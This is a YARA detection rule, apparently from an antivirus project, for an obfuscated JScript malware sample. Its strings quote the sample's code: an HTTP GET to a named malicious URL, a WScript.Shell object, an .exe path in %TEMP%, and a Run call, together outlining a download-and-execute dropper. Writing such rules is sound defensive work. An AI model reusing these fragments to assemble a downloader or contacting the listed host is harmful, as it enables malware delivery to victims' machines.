rule sig_20160330_752b1b7c4f67265b96df5686cd9da4d4 {
  meta:
    description = "datamaliciousorder - file 20160330_752b1b7c4f67265b96df5686cd9da4d4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a879590d24b7767bac603902f57877f16a3010d5cd09ef4870de5f7d536843b4"

  strings:
    $s1  = "_H0[_A0](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _H(_P1, _EF){_P = _P * 1; return _P1 - _EF;};" fullword ascii
    $s3  = "var _ME = function _J() {return WScript[_ZH](\"WScript\"+\".Shell\");}(), _OC = 11;" fullword ascii
    $s4  = "if (_H0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _FK(){return _VG + \"\";};" fullword ascii
    $s6  = "function _KT() {return _ME[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cQvZxdPE2a9bB.ex\" + \"e\";};" fullword ascii
    $s7  = "function _GY(_RU){_ME[\"Run\"](_RU, _P, _P);};" fullword ascii
    $s8  = "function _A() {return ((_HP == true) && (_HP == _K)) ? 1 : _P;};" fullword ascii
    $s9  = "function _V()" fullword ascii
    $s10 = "function _CT(_Y) {var _P0 = (1, 2, 3, 4, 5, _Y); return _P0;};" fullword ascii
    $s11 = "return _H(_AI, _B);" fullword ascii
    $s12 = "function _TM(){return 22;};" fullword ascii
    $s13 = " while (_QK){" fullword ascii
    $s14 = "function _NN(){return _ZH;};" fullword ascii
    $s15 = "var _F = new this[\"Date\"]();" fullword ascii
    $s16 = "var _E = false;" fullword ascii
    $s17 = "var _K = false;" fullword ascii
    $s18 = "_K = true; " fullword ascii
    $s19 = "var _HP = false;" fullword ascii
    $s20 = "_HP = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}